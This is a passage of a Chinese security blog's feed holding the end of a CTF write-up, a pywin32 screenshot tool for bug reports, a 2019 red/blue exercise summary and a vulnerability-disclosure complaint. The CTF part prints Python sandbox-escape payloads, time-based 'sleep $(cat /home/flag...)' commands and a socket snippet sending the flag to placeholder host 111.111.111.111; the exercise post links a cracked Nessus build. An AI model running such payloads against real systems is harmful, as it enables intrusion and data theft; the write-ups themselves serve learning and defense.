class="line">conn.sendline(&#39;des &#39;+s)</span><br><span class="line">return cut_text(conn.recv(),16)[:-1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fuck():</span><br><span class="line">r &#x3D; conn()</span><br><span class="line">f &#x3D; &#39;flag&#123;c0&#39;</span><br><span class="line">for k in range(1,5):</span><br><span class="line">pad &#x3D; 0</span><br><span class="line"></span><br><span class="line">for j in range(8):</span><br><span class="line">padding&#x3D;&#39;0&#39;*(8-pad)</span><br><span class="line"></span><br><span class="line">stand &#x3D; get(r,padding)[k]</span><br><span class="line">for i in flagkey:</span><br><span class="line">stand2 &#x3D; get(r,padding+f+i)[k]</span><br><span class="line"></span><br><span class="line">if stand &#x3D;&#x3D; stand2:</span><br><span class="line">pad &#x3D; pad + 1</span><br><span class="line">f &#x3D; f + i</span><br><span class="line">print f</span><br><span class="line">break</span><br><span class="line"></span><br><span class="line">fuck()</span><br><span class="line">#flag&#123;c0ngratul4tions_1_y0uve_chec7ed_1n_ogeek&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="pybox"><a href="#pybox" class="headerlink" title="pybox"></a>pybox</h3><p>绕过思路和ciscn的一样,就是没回显</p><p><code>__import__.__getattribute__(&#39;__clo&#39;+&#39;sure__&#39;)[0].cell_contents(&#39;o&#39;+&#39;s&#39;).__getattribute__(&#39;sy&#39;+&#39;stem&#39;)(&#39;sleep 4&#39;)</code></p><p>那就弹,又是<code>nv,curl,wget</code>都试一遍,无果</p><p>看提示,cut,sleep,那就是时间盲注了</p><p><code> __import__.__getattribute__(&#39;__clo&#39;+&#39;sure__&#39;)[0].cell_contents(&#39;o&#39;+&#39;s&#39;).__getattribute__(&#39;sy&#39;+&#39;stem&#39;)(&#39;sleep $(ca&#39;+&#39;t /home/flag|cut -c1|tr f 4)&#39;)</code></p><p>但是tr被过滤了,尝试别的方法替换字符串.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__.__getattribute__(&#39;__clo&#39;+&#39;sure__&#39;)[0].cell_contents(&#39;o&#39;+&#39;s&#39;).__getattribute__(&#39;sy&#39;+&#39;stem&#39;)(&quot;export str&#x3D;\&#96;tac &#x2F;home&#x2F;flag\&#96;;str&#x3D;$&#123;str:0:1&#125;;str&#x3D;$&#123;str&#x2F;f&#x2F;2&#125; &amp;&amp; sleep $str &quot;)  </span><br></pre></td></tr></table></figure><p>不知道为什么只有通配符能替换,ascii1-256都不行,无果</p><p>又是队内大佬提示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s=__import__.__getattribute__(&#x27;__clo&#x27;+&#x27;sure__&#x27;)[0].cell_contents(&#x27;socket&#x27;).__getattribute__(&#x27;socket&#x27;)()</span><br><span class="line">s.connect((&#x27;111.111.111.111&#x27;, 11111))</span><br><span class="line">p=__import__.__getattribute__(&#x27;__clo&#x27;+&#x27;sure__&#x27;)[0].cell_contents(&#x27;o&#x27;+&#x27;s&#x27;).__getattribute__(&#x27;popen&#x27;)(&#x27;cut -c 1-64 flag&#x27;)</span><br><span class="line">s.send(p.read())</span><br></pre></td></tr></table></figure><p>感觉这是非预期解了</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;写在之前&quot;&gt;&lt;a href=&quot;#写在之前&quot; class=&quot;headerlink&quot; title=&quot;写在之前&quot;&gt;&lt;/a&gt;写在之前&lt;/h2&gt;&lt;p&gt;周末打了这个比赛,趟大佬的车,混到第六.如果不是我这么菜,有机会第四或第三的.&lt;/p&gt;
&lt;p&gt;如此简单的web题都解不了,丢人(捂脸&lt;/p&gt;
&lt;p&gt;感谢比赛过程中队内各位大佬给的各种提示.&lt;/p&gt;
&lt;p&gt;以下writeup仅是我自己能解的题或参与解的题.&lt;/p&gt;</summary>
    
    
    
    <category term="CTF&amp;AWD" scheme="https://m09ic.top/categories/CTF-AWD/"/>
    
    
    <category term="writeup" scheme="https://m09ic.top/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>刷SRC的实用小技巧-自动截图</title>
    <link href="https://m09ic.top/posts/14990/"/>
    <id>https://m09ic.top/posts/14990/</id>
    <published>2019-08-04T12:06:12.000Z</published>
    <updated>2021-01-04T14:51:39.629Z</updated>
    
    <content type="html"><![CDATA[<p><em>本文原发于<a href="https://www.secquan.org/Notes/1070004">https://www.secquan.org/Notes/1070004</a>,博客转自本人仅做备份用途</em></p><h2 id="写在之前"><a href="#写在之前" class="headerlink" title="写在之前"></a>写在之前</h2><p>各大网站以及SRC之类的地方提交漏洞免不了需要截图,手动截图费时费力,我也深受其扰.使用python调用windows api实现自动截图才是正道.可能有很多师傅已经知道了,但是还是厚颜无耻写下.</p><a id="more"></a><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>思路很简单,呼出一个新窗口,运行poc,截图运行成果.适用于新漏洞快速刷钱.代码实现也不难.直接进入正题.</p><p>首先需要安装python 和 pywin32这个库(具体安装方法自行查阅百度google).</p><p>然后需要通过windows api实现截图功能.</p><p>因为批量刷,少不了大量后台运行的子进程,用一些python图形库截图只能截显示屏显示的内容.想要截到非活跃页面的图,只能用windows api.</p><p>pywin32这个库就封装了大量windows api操作.</p><p>首先需要实现截图功能.</p><p>直接上关键代码,这个代码是网上抄来的稍微修改了一下.第一个参数填截图的保存路径,第二个参数填窗口句柄(window handle)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">window_capture</span>(<span class="params">filename,hwnd</span>):</span></span><br><span class="line"> <span class="comment"># 窗口的编号，0号表示当前活跃窗口</span></span><br><span class="line">    <span class="comment"># 根据窗口句柄获取窗口的设备上下文DC（Divice Context）</span></span><br><span class="line">    hwndDC = win32gui.GetWindowDC(hwnd)</span><br><span class="line">    <span class="comment"># 根据窗口的DC获取mfcDC</span></span><br><span class="line">    mfcDC = win32ui.CreateDCFromHandle(hwndDC)</span><br><span class="line">    <span class="comment"># mfcDC创建可兼容的DC</span></span><br><span class="line">    saveDC = mfcDC.CreateCompatibleDC()</span><br><span class="line">    <span class="comment"># 创建bigmap准备保存图片</span></span><br><span class="line">    saveBitMap = win32ui.CreateBitmap()</span><br><span class="line">    <span class="comment"># 获取监控器信息</span></span><br><span class="line">    MoniterDev = win32api.EnumDisplayMonitors(<span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">    rect = win32gui.GetWindowRect(hwnd)</span><br><span class="line"></span><br><span class="line">    w = rect[<span class="number">2</span>]-rect[<span class="number">0</span>]</span><br><span class="line">    h = rect[<span class="number">3</span>]-rect[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># print w,h　　　#图片大小</span></span><br><span class="line">    <span class="comment"># 为bitmap开辟空间</span></span><br><span class="line">    saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)</span><br><span class="line">    <span class="comment"># 高度saveDC，将截图保存到saveBitmap中</span></span><br><span class="line">    saveDC.SelectObject(saveBitMap)</span><br><span class="line">    <span class="comment"># 截取从左上角（0，0）长宽为（w，h）的图片</span></span><br><span class="line">    saveDC.BitBlt((<span class="number">0</span>, <span class="number">0</span>), (w, h), mfcDC, (<span class="number">0</span>, <span class="number">0</span>), win32con.SRCCOPY)</span><br><span class="line">    saveBitMap.SaveBitmapFile(saveDC, filename)</span><br></pre></td></tr></table></figure><p>但是windows api没有获取当前代码运行窗口的窗口句柄,因此,只能绕路.通过遍历窗口的pid进行对比,反查到句柄.上代码(也是抄的).</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_hwnds_for_pid</span>(<span class="params">pid</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">callback</span>(<span class="params">hwnd, hwnds</span>):</span></span><br><span class="line">        <span class="keyword">if</span> win32gui.IsWindowVisible(hwnd) <span class="keyword">and</span> win32gui.IsWindowEnabled(hwnd):</span><br><span class="line">            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)</span><br><span class="line">            <span class="keyword">if</span> found_pid == pid:</span><br><span class="line">                hwnds.append(hwnd)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    hwnds = []</span><br><span class="line">    win32gui.EnumWindows(callback, hwnds)</span><br><span class="line">    <span class="keyword">return</span> hwnds</span><br></pre></td></tr></table></figure><p>需要注意的是,这里有个坑.因为如果调用cmd运行poc,会生成一个子进程,直接<code>os.getpid()</code>获取的是子进程的pid.需要注意获取的pid不能是子进程的pid,而是获取<code>os.getppid()</code>.</p><p>将以上代码放在同一个文件里,调用系统命令运行poc文件. 把<code>window_capture()</code>放在末尾行,如果需要还可以写一个导出报告的函数.</p><p>这里又有一个小坑. 最好在前面加上一个<code>time.sleep(1)</code>.因为比如git bash或pycharm的输出不是实时的,可能导致已经截图了,但是输出还没出来.经过测试cmd和powershell不会有这种情况.</p><p>我们需要的肯定是批量,刚才的能做到的只是单个.</p><p>所以需要一些操作.在另外一个文件中调用cmd,运行刚才这个文件.</p><p>比如<code>subprocess.Popen(&quot;start python poc.py -t %s -p %s&quot; % (ip, port), shell=True)</code></p><p>windows cmd中可以用start创建一个新窗口,并且该窗口是独立的进程.因此在<code>poc.py</code>就只需要<code>os.getpid()</code>.</p><p>如果需要批量,使用for循环即可.</p><p>效果如下:</p><p><img src="1.png" alt="1"></p><p><img src="2.png" alt="2"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;em&gt;本文原发于&lt;a href=&quot;https://www.secquan.org/Notes/1070004&quot;&gt;https://www.secquan.org/Notes/1070004&lt;/a&gt;,博客转自本人仅做备份用途&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;写在之前&quot;&gt;&lt;a href=&quot;#写在之前&quot; class=&quot;headerlink&quot; title=&quot;写在之前&quot;&gt;&lt;/a&gt;写在之前&lt;/h2&gt;&lt;p&gt;各大网站以及SRC之类的地方提交漏洞免不了需要截图,手动截图费时费力,我也深受其扰.使用python调用windows api实现自动截图才是正道.可能有很多师傅已经知道了,但是还是厚颜无耻写下.&lt;/p&gt;</summary>
    
    
    
    <category term="编程" scheme="https://m09ic.top/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="学习笔记" scheme="https://m09ic.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>我的hw2019总结</title>
    <link href="https://m09ic.top/posts/44974/"/>
    <id>https://m09ic.top/posts/44974/</id>
    <published>2019-07-27T12:04:22.000Z</published>
    <updated>2021-01-04T14:51:44.910Z</updated>
    
    <content type="html"><![CDATA[<p><em>本文原发于T00LS <a href="https://www.t00ls.net/articles-52212.html">https://www.t00ls.net/articles-52212.html</a>,博客转自本人仅做备份用途</em></p><h2 id="写在之前"><a href="#写在之前" class="headerlink" title="写在之前"></a>写在之前</h2><p>这个总结来的比较晚了,007hw半个月弄完后出去玩了一段时间,回来又打了几天游戏(捂脸</p><p>其实也没什么特别的技巧,但是也算是我第一次接触实战环境的企业安全.</p><p>运气好既参加过防守方也当过三天攻击方.</p><p>写一下学习笔记.写得比较随意,逻辑排版都有些混乱,见谅.</p><p>以下大部分数据已抹去关键信息,并且进行了一定的修改.</p><a id="more"></a><h2 id="接手"><a href="#接手" class="headerlink" title="接手"></a>接手</h2><p>和某司谈好价格,当晚就出发了(真不怕被卖了,心大</p><p>我到的时候已经是12号,行动开始已经两天了.</p><p>到单位后,发现有一个十多人的小团队日夜连轴转,圈内知名大佬带队;流量审计,日志审计,内部红蓝对抗测试有条不紊.</p><p>好吧,以上都是我的想象,实际情况是,除了该单位原本的网信部门四五人,没有人懂网络安全,都是靠着电话疯狂咨询购买设备的乙方公司度日.</p><p>实际情况出地铁口就看到这单位有三幢高25层高的大楼,以及旁边近十栋其他建筑,多个位于不同地区的下属单位,这所有的流量都先进过该单位的防火墙.</p><p><img src="sum.png" alt="taishiganzhi"></p><p>这是态势感知里面的资产汇总,web没这么多,因为一些办公用pc默认打开的IIS没关.</p><p>实际上只有几十个不同的内外网web服务.安全设备基本是一整套老的各大厂的设备.包括IDS,IPS,态势感知,下一代防火墙,WAF,流量审计,堡垒机,网闸等十数台,以及新的某个单独公司的一整套安全设备,除了以上提到的,还有apt感知,dpi探针,蜜罐等等十数台安全设备.各下属单位还有各自的安全设备,除了apt感知,dpi探针这两个设备外基本也有一整套,只是流量会先经过我这边的防火墙.总的来说基本上每类设备都有三台或以上,一次hw感觉把国内各大厂的设备都见识了一遍.</p><p>wdnmd,这东西就我一个人防守?</p><h2 id="摸查"><a href="#摸查" class="headerlink" title="摸查"></a>摸查</h2><p>本来火车上一晚上没睡,看到这架势瞬间清醒,开始工作.</p><p>因为最近该单位购入了不少新设备,还处于测试阶段,网络拓补图都还没更新,只有一个防火墙里面带的网络拓补图功能,还有少量设备没有添加进去,也是第一次看到这蜘蛛网一样的内网架构,直到第三四天才大致弄清楚.</p><p>大致上整个内网连在一起,办公网和业务在同一个内网,没有做各种隔离,可以直接访问.</p><p>然后准备清查下资产,结果内外网的服务资产清单也没有.都得亲手弄.</p><p>先挂着nmap扫下公网网段,这单位公网还不在同一个C段,总共有五六十个ip地址,不是每个上面都有服务,因为不少服务开在高端口,直接全端口扫描.</p><p>内网也挂个nessus扫B段,主要是扫几个业务网段的C段.</p><p>新版nessus被限制只能扫16个ip,网上找到的无限制版.</p><p><a href="https://pan.baidu.com/s/1byuxNOacLhIgwijAqW6NWg">https://pan.baidu.com/s/1byuxNOacLhIgwijAqW6NWg</a> 提取码: 2333</p><p>拿<a href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a>扫了下子域名.</p><p>顺便在zoomeye,shodan之类的搜索引擎上手动翻了翻公网资产.</p><p>只进行了一些简单的资产清查,事实上,在后面的一段时间,还经常能发现一些疏漏的资产,万幸的是虽然有攻击行为,但没有被打穿.</p><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>等各种扫描器结果的时候,翻了翻前两天的各种日志,好在各个平台都汇总到态势感知了,方便很多.</p><p>最开始打算审计下日志,光两个门户网站,一天40w+条http访问记录.只能放弃.只能看先告警信息,然后在指定ip审计日志.花了几个小时大致翻了下数千条告警日志,99%以上攻击流量都是扫描器.</p><p>感觉这类被动防御的安全设备局限挺大,告警信息基本都是被已经拦截的流量,没被拦截的流量根本不告警.一旦流量特别大,大到人力不可逐条审计的时候,只能等待被黑才能反查线索.</p><p>看了下攻击特征,awvs,ibmscan之类的扫描器基本没有,毕竟动静太大了,主要是类似pocsuite这类的可以直接打exp的测试工具以及一些小工具.</p><p>顺便还发现了还有大佬爆破webshell路径和密码的.感觉这个不像是攻击方打出来的,可能是某些黑产团队全网乱扫,里面找到了一些知名的webshell密码.</p><p>主要还是外网对内网的扫描,内网一切太平.</p><p>翻完流量记录,基本可以确定前两天还没有被人直接进来内网漫游.当然也有可能是已经进来了,但是内网渗透特别谨慎,没有触发过一次报警.听说过一些大佬,在内网渗透的时候可以熬半年一年,慢慢潜伏收集信息然后来一波大的.</p><p>听单位的人说,前两天钓鱼邮件特别多,他们现在已经把邮件服务器关了,但是我寻思,人家如果找到了员工其他邮箱,比如qq,网易邮箱,会上钩的还是会上钩.</p><p>某厂apt感知的设备有一个文件监测的功能,整个内网中传输的所有文件都会经过沙箱运行,有敏感行为会报警.这功能还不错,省去很大麻烦,刚才提到的大量钓鱼邮件就是这个沙箱发现的.</p><p>翻了下apt设备报警的几个文件,有三个doc,用的cve-2017-11826,还有几个后缀就是exe.这单位连网信中心的员工都没打开文件夹选项中的显示文件后缀名,中招的几率还真不小.</p><p>翻着翻着然后就闹了个乌龙.态势感知报警某个人pc上有木马行为.吓得我一身冷汗,直接找到那台电脑看了半天也没找到攻击痕迹,看着事件记录器里面有system账户登录并且分配权限的记录,还以为真被黑了.然后才发现对外网连接的域名是快压.流氓软件里面带广告木马,设备误认为是木马反弹了shell回去.</p><p>还一台内网的提供dns服务的服务器,因为版本太老了,发送的流量包一直会出发报警,apt感知设备里面直接写明了已沦陷,也花了不少时间去分析.后来在一台最新的cenos系统上重新搭了一个dns服务器,问题就解决了.毕竟用dns shell这种相对较为隐蔽的后门更符合攻击方大佬的风格.</p><p>来来回回折腾了一整天各种设备.感觉有个功能比较缺,就是不能直接导出日志,得在态势感知里面一条一条点一条一条看,效率极低.然后就写了个脚本,按照apache的日志格式把态势感知里面的数据导出来.只要某个攻击者ip触发过一次报警,就会导出他的所有http访问日志.</p><p>大致效果如下:</p><p><img src="1.png" alt="1"></p><p><img src="2.png" alt="2"></p><p>稍微方便日志审计.</p><p>脚本在我的github,仅适配了某厂的态势感知平台,类似一个爬虫一样爬数据然后简单处理汇总.</p><p><a href="https://github.com/M09Ic/myscript">myscript</a></p><p><img src="3.png" alt="3"></p><p>把一些常用的功能集合到了一起.完全定制的,不具有通用性,看看就好..</p><p>还是可以看到有很多没有告警的攻击行为的,比如大量目录爆破,exp盲打等.</p><p>中间还写了不少脚本帮我处理这对我来说稍微有点庞大的流量数据.</p><p>比较有意思的是,写脚本的时候发现了某司态势感知有未授权访问漏洞,能访问态势感知内的全部记录.遂当即提交.还闹了点不愉快.毕竟某司靠产品经理做应急响应(捂脸).</p><p>还有某厂设备防火墙,只认ip不认cookie,可以绕过验证机制直接访问.</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>到nmap和nessus这些扫描器的结果出来,一看几十个红红的严重漏洞.稍微分析了下,全部漏洞都是版本落后导致的.当然这也和用的扫描器有关系,只能扫这些漏洞.</p><p>其中主要的能利用的还是各自web中间件为主,比如weblogic,还出了0day.如果别人进了内网,这时候又还没做内网隔离,是可以直接杀穿内网的.</p><p>weblogic被攻击的那个组件是老问题了,基本上每年都发病,黑名单过滤总是能绕过,直接删掉这个组件就能解决问题.后来官方修复终于改成白名单了.</p><p>还有一些老旧的打印机,nas,包括一个思科的路由器(漏洞是方程式组织爆出的其中一个,思科官方都已经放弃修复了),都存在不少RCE,不少漏洞网上直接能找到exp.</p><p>特别是一些打印机,账号admin,密码admin,123456的一堆,打开web界面也是充满年代感.不用弱密码估计也有不少漏洞.就暂时停用或者不接入内网,仅个人使用.</p><p>还有ftp空密码或弱密码,以及ftp系统的一些rce,拿着十年前公开的exp就可以乱杀.</p><p>还一个windows iis的MS15-034,好像没有rce的exp,只有一些信息泄露的poc.以防万一还是打了补丁.</p><p>实际上内网还是比较薄弱的,原因主要在该单位不少员工自建了nas,ftp,打印机甚至数据库等服务,并且缺乏维护,漏洞较多且存在大量弱口令.而且部分内网服务长时间不升级,多个RCE在内网晃了好几年.</p><p>而且内网各网段直接没有隔离,任何一台机子沦陷,都有可能导致整个内网开花.</p><p>外网的话,停用了部分边缘的服务,留下十来个比较重要不能关闭的的服务.摸清楚使用的框架和中间件,整理一个资产清单,时刻关注漏洞情报,如果是老版本能升级,先升级.</p><p>大中型企业单位内网主要都是以java为主,所以一些sql注入之类的漏洞就不太容易出现,也减少了很大的麻烦.门户网站前台基本是静态页面,后台管理在高端口,路径也不是特别容易爆破的,加个验证码,不要弱密码.这样一套下去,只要不出未授权访问和中间件的RCE漏洞,攻击方就很难进攻.</p><p>这单位大部分系统都云化了,用vmware管理,直接禁用网卡,上线和下线的速度都很快.</p><p>修复内网漏洞花了好几天时间,外网做的还算可以,一直看着攻击方各种扫描.一开始还封ip,封着封着第三天就上代理池扫描器了,就干脆不封了.只把这些ip放到一个灰名单里面,用脚本持续输出流量日志方便监控.</p><p>听说某些单位一天能封700个C段数万个ip,感觉有些过度防卫了.我这里就封这么点ip还误封了某cdn,导致互联网上大量图片视频无法加载,下面员工电话疯狂轰炸.</p><p>总得来说,摸清楚资产,关闭边缘服务,清理弱密码,修复漏洞.这样一套只要不是0day和钓鱼就很难攻击进来.</p><p>当然还是重边界清内网,内网这上万台各类机子,很难保证能扫描到所有问题,一些打印机,路由器0day也比较多.如果边界被突破,内网防护能力会弱很多.所以已经做好了如果被黑直接断网的打算.</p><p>应对钓鱼攻击,单位还做了几十块板子,写着一些网络安全防护的tips,贴在电梯,办公室之类的地方.虽然用处可能不是很大(捂脸)</p><h2 id="反击"><a href="#反击" class="headerlink" title="反击"></a>反击</h2><p>其实也可以通过一些简单手段进行反击.虽然我没有成功,但是也听说了一些案例.</p><p>某些攻击人员喜欢拿自己的vps当做跳板,可能因为工具全.但是有些人也喜欢把博客建在上面,或者曾经把博客的域名绑定到这个vps上过.这时候就可以通过反查whois信息,找到网站或者身份信息.然后添加社交软件社工.甚至通过朋友圈找到了那位师傅姓名照片和当时住的酒店.</p><p>听说后我也写了一个脚本,批量反查攻击ip的whois信息,但是并没有收获.</p><p>脚本在这  <a href="https://github.com/M09Ic/myscript/blob/master/reverse_whois.py">https://github.com/M09Ic/myscript/blob/master/reverse_whois.py</a></p><p>sqlmap 远程代码执行,awvs两个远程代码执行漏洞.github上有师傅写过一个多个漏洞集成的反击工具.</p><p>蜜罐,因为领导觉得蜜罐放公网有点招蜂引蝶的意思,保险起见就只把蜜罐开在内网了.不过据说某司蜜罐还是发挥了很大作用. </p><h2 id="0day"><a href="#0day" class="headerlink" title="0day"></a>0day</h2><p>最关键的部分就是0day,看起来这几十台各类各大厂的安全设备,但实际上对0day的防护能力还是0.</p><p>目前防护的办法就是尽快得到消息,然后下线相关系统修复.</p><p>大佬们确实很强,主流的java框架和中间件在hw期间都出了0day或1day,有多少是大佬打出来的就不知道了.</p><p>简单整理一下.</p><p>weblogic  <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2729">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2729</a></p><p>jboss <a href="https://xz.aliyun.com/t/5326">https://xz.aliyun.com/t/5326</a></p><p>webpshere <a href="https://www.seebug.org/vuldb/ssvid-98002">https://www.seebug.org/vuldb/ssvid-98002</a></p><p>tomcat <a href="https://paper.seebug.org/958/">https://paper.seebug.org/958/</a></p><p>fastjson <a href="https://www.anquanke.com/post/id/181874">https://www.anquanke.com/post/id/181874</a></p><p>windows 域控 <a href="https://paper.seebug.org/962/">https://paper.seebug.org/962/</a></p><p>strust2 某个老版本补丁绕过 RCE</p><p>还有一些比如深信服 ssl vpn , jumpserver堡垒机, 禅道项目管理,致远oa,coremail邮件系统等等一堆应用的0day.</p><p>总得来说,防0day就靠水群,水着水着就有师傅出来爆漏洞预警,如果是被第一个打的,只能gg.</p><p>关于0day的确实毫无抵抗之类,可见的未来之内也找不到好的方法防御.只能是关注动态,快速响应.</p><p>如果只知道0day大致信息,可以在waf上配置相应规则捕捉攻击流量.</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>正好某市也举办了攻防演练.这次应某公司邀请去当攻击方.</p><p>不过市护网时间比较短,加上报道也就三天,应该只能进行简单渗透.</p><p>第一天拿到目标清单,看了下,估计应该防守方比较薄弱,某些单位明显不像是有防守能力的.事实上也差不多.</p><p>目标比较多,就直接先上某司公网扫描器扫一遍.还真有不少收获.</p><p>自己也去手动测试了几个漏洞,时间比较有限,基本上是一个站扫描+简单手动测试,没有漏洞就换下一个目标.</p><p>运气好找到一个很老的站的弱密码,进去之后千疮百孔.xss,sql,csrf等等该有的全都有了,刷了不少分.</p><p>稍微有趣的是,这个系统sql还有过滤,过滤了不少重要函数与关键字.绕了半天也无法getshell,一怒之下用benchmark函数dos攻击,把一个无用的sql漏洞变成dos.感觉和打ctf一样.</p><p>然后又找到了某司的某产品一个未授权访问漏洞.未授权访问漏洞基本上不带cookie把全部api访问一遍,靠运气撞,总能遇到的.</p><p>看了下其他队伍,得分特别高的主要也是现成漏洞直接rce开启内网漫游,大部分企业还是重边界轻内网,一旦边界被突破,加上没有防守力量,很容易被打穿内网得到.weblogic是得分主力.</p><p>2019.8.4 update</p><p>某省护网小伙伴去了,回来和我分享了下经验.</p><p>主要还是强调了信息收集和社工的重要性.</p><p>某大厂通过搜索到某单位官网上的一个qq群,没有验证,直接进群了.再在群公告中找到了一个内部核心群.这个内部核心群里有VPN账号密码,和多个重要系统的账号密码.直接进内网开始漫游,拿到大量分数.</p><p>还有某厂,weblogic的cve-2019-2529进内网,钓鱼管理员得到更多的重要信息,开始内网漫游.</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>刷src打ctf和这种红蓝对抗是完全不同的思路,红蓝对抗大多不会这么细致的去寻找每一个可利用的,攻击方眼中只有getshell.一旦getshell,除了某些防御能力极其强的单位,内网还有一二三级划分,各部门之间还有边界之外,基本没有反抗能力,只能断网清理木马后门,寻找攻击痕迹.</p><p>红方和蓝方也是完全不同的思路.这种大型攻防演练中,防守方很容易过度防守,下线业务,大规模封ip之类的.而像我这么菜的攻击方则是到处碰运气,找弱口令,找各大框架的1wday漏洞,找未授权访问.所以攻击方的主要手段就变成了信息收集.或者使用钓鱼手段,通过个人终端进行内网渗透.</p><p>运气挺好的,hw期间除了ssl vpn 0day之外,其他没有影响到我们.tomcat虽然用的比较多,也有了poc,但是利用条件比较苛刻还是什么原因,没有被攻击.侥幸苟过3周,功成身退.</p><p>至于内网渗透,我太菜了,根本感觉不出什么东西.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;em&gt;本文原发于T00LS &lt;a href=&quot;https://www.t00ls.net/articles-52212.html&quot;&gt;https://www.t00ls.net/articles-52212.html&lt;/a&gt;,博客转自本人仅做备份用途&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;写在之前&quot;&gt;&lt;a href=&quot;#写在之前&quot; class=&quot;headerlink&quot; title=&quot;写在之前&quot;&gt;&lt;/a&gt;写在之前&lt;/h2&gt;&lt;p&gt;这个总结来的比较晚了,007hw半个月弄完后出去玩了一段时间,回来又打了几天游戏(捂脸&lt;/p&gt;
&lt;p&gt;其实也没什么特别的技巧,但是也算是我第一次接触实战环境的企业安全.&lt;/p&gt;
&lt;p&gt;运气好既参加过防守方也当过三天攻击方.&lt;/p&gt;
&lt;p&gt;写一下学习笔记.写得比较随意,逻辑排版都有些混乱,见谅.&lt;/p&gt;
&lt;p&gt;以下大部分数据已抹去关键信息,并且进行了一定的修改.&lt;/p&gt;</summary>
    
    
    
    <category term="网络安全" scheme="https://m09ic.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="学习笔记" scheme="https://m09ic.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红蓝对抗" scheme="https://m09ic.top/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>记一次不愉快的挖洞经历</title>
    <link href="https://m09ic.top/posts/12282/"/>
    <id>https://m09ic.top/posts/12282/</id>
    <published>2019-06-16T01:24:06.000Z</published>
    <updated>2021-01-04T14:51:20.711Z</updated>
    
    <content type="html"><![CDATA[<p>hw期间,作为防守方使用某厂(国内大厂)态势感知系统的时候发现某重要接口未授权访问.</p><p>大概是今年1月份发布的版本,而且更新需要原厂人员进行手动升级.</p><a id="more"></a><p><img src="1.png" alt="1"></p><p>上面三个接口调用的同一api,均可以获取数据.接口返回的数据内容包括整个系统的数十亿条(数TB大小)流量日志,报警内容等.</p><p>漏洞证明:</p><p><img src="2.jpg" alt="2"></p><p>马上上报至该厂商,该厂商的某产品经理表示感谢,并以个人身份给我转了200并要求保密.全程没有一个技术人员与我确认漏洞危害性以及影响范围.</p><p>询问是否有官方漏洞奖励计划时,该厂商(后确认只是该产品经理个人行为,不代表官方立场)认为申请漏洞奖励计划是勒索行为,并打电话至我老师处声称你校有学生在勒索我厂.全程均有聊天记录,电话录音作证.</p><p><img src="3.jpg" alt="3"></p><p>建议各位以后提交漏洞不要直接冲塔,你永远不知道某些领导的脑回路.建议提交至第三方平台,以个人身份提交漏洞永远是弱势一方.</p><p>此事之后,已对国内某些厂商彻底失望,以后努力提升自己,尽量远离某些国内大厂.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;hw期间,作为防守方使用某厂(国内大厂)态势感知系统的时候发现某重要接口未授权访问.&lt;/p&gt;
&lt;p&gt;大概是今年1月份发布的版本,而且更新需要原厂人员进行手动升级.&lt;/p&gt;</summary>
    
    
    
    <category term="网络安全" scheme="https://m09ic.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="WEB" scheme="https://m09ic.top/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>XSS bypass 安恒玄武盾</title>
    <link href="https://m09ic.top/posts/34838/"/>
    <id>https://m09ic.top/posts/34838/</id>
